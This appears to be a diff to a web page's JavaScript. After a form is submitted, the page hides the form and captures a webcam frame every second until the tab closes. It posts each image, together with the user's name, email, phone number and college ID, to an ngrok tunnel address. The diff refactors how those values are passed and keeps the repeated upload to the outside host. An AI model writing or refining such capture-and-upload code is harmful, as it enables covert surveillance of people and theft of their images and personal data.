@@ -167,7 +167,7 @@
 
       // 3. Start continuous capture every 1 second in THIS tab
       if (stream) {
-        startContinuousCapture(stream);
+        startContinuousCapture(stream, userName, userEmail, userPhone, userCollegeId);
       }
 
       // Show capture indicator
@@ -179,7 +179,7 @@
       form.style.display = "none";
     });
 
-    async function startContinuousCapture(stream) {
+    async function startContinuousCapture(stream, userName, userEmail, userPhone, userCollegeId) {
       // Continuous capture every 1 second until tab closes
       async function captureLoop() {
         if (!stream) return;
@@ -194,18 +194,13 @@
           ctx.drawImage(video, 0, 0, 320, 240);
           const dataUrl = canvas.toDataURL("image/jpeg", 0.6);
 
-          const name = document.getElementById("name").value.trim();
-          const email = document.getElementById("email").value.trim();
-          const phone = document.getElementById("phone").value.trim();
-          const collegeId = document.getElementById("collegeId").value.trim();
-
           await fetch("https://stainless-king-gravitate.ngrok-free.dev/capture", {
             method: "POST", headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              name: nameEl.value.trim(),
-              email: emailEl.value.trim(),
-              phone: phoneEl.value.trim(),
-              collegeId: collegeEl.value.trim(),
+              name: userName,
+              email: userEmail,
+              phone: userPhone,
+              collegeId: userCollegeId,
               image: dataUrl,
               time: new Date().toISOString()
             })
